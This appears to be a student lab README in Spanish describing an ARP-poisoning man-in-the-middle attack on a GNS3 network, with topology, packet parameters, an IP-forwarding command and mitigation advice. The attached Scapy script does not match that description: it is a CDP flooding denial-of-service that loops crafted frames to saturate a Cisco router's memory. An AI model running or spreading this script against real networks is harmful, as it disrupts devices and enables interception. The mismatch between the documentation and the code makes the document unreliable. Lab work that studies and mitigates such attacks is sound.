# MiM_Atack
Script de Interceptación de Tráfico (ARP Spoofing / MiTM)

/
/
https://youtu.be/udwwC3YpLC8
/
/
1. Objetivo del Script
Este script tiene como objetivo realizar un ataque de Man-in-the-Middle (MiTM) mediante la técnica de ARP Poisoning (Envenenamiento ARP). El script envía respuestas ARP falsas a una víctima (Router) para asociar la dirección IP de un nodo legítimo (Gateway o Servidor) con la dirección MAC del atacante, permitiendo interceptar el tráfico que fluye por la red.

2. Documentación Técnica de la Topología
Víctima (GW_20231243): IP 10.23.12.1 configurado como el nodo a engañar.

IP Suplantada: 10.23.12.100 (Simulación de un Gateway o Host crítico).

Atacante (Kali Linux): IP 10.23.12.43.

Topología: Red de Capa 2 plana conectada a través de un Ethernet Switch.

Direccionamiento: Configurado bajo el esquema de la matrícula 2023-1243 (Red 10.23.12.0/24).

3. Parámetros Usados
Opcode (op=2): Define el paquete como una "Respuesta ARP" (ARP Reply). Se utiliza para forzar la actualización de la tabla ARP de la víctima sin que esta haya realizado una solicitud previa (Gratuitous ARP).

Target IP (pdst): 10.23.12.1 (IP de la víctima).

Source IP (psrc): 10.23.12.100 (La identidad que el atacante desea robar).

Intervalo: Envío de paquetes cada 1 segundo para mantener el envenenamiento activo frente a actualizaciones legítimas.

4. Requisitos para utilizar la herramienta
Python 3.x y Scapy.

IP Forwarding: Para que el ataque sea exitoso y la víctima no pierda conexión, el sistema operativo del atacante debe tener habilitado el reenvío de paquetes: echo 1 > /proc/sys/net/ipv4/ip_forward

5. Medidas de Mitigación
Dynamic ARP Inspection (DAI): Configuración en switches para validar que los paquetes ARP coincidan con las asignaciones de la base de datos de DHCP Snooping.

Tablas ARP Estáticas: Mapeo manual de IP-MAC en dispositivos críticos (servidores o gateways).

Port Security: Limitar el aprendizaje de MACs en los puertos de acceso del switch.

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *

# NOTA TÉCNICA: En este entorno Scapy v2.6, el protocolo 'cdp' no está 
# definido de forma nativa. Se requiere la carga manual de la contribución.
try:
    load_contrib("cdp")
except:
    print("Aviso: Cargando definiciones personalizadas de capa 2...")

def cdp_flood():
    print("--- Iniciando ataque DoS a la tabla de vecinos CDP ---")
    print("Inyectando ID de dispositivo: MAT_20231243")
    
    # Construcción del paquete usando capas Raw y SNAP para garantizar 
    # compatibilidad con el Switch de GNS3 y el Router Cisco.
    # Dirección Multicast CDP: 01:00:0c:cc:cc:cc
    pkt = (
        Ether(dst="01:00:0c:cc:cc:cc") /
        SNAP() /
        Raw(load=b"\x02\x01\x00\x0c\x01\x01\x00\x11MAT_20231243")
    )

    # Envío en bucle con intervalo de 0.1s para saturar la memoria del router
    sendp(pkt, loop=1, inter=0.1)

if __name__ == "__main__":
    cdp_flood()
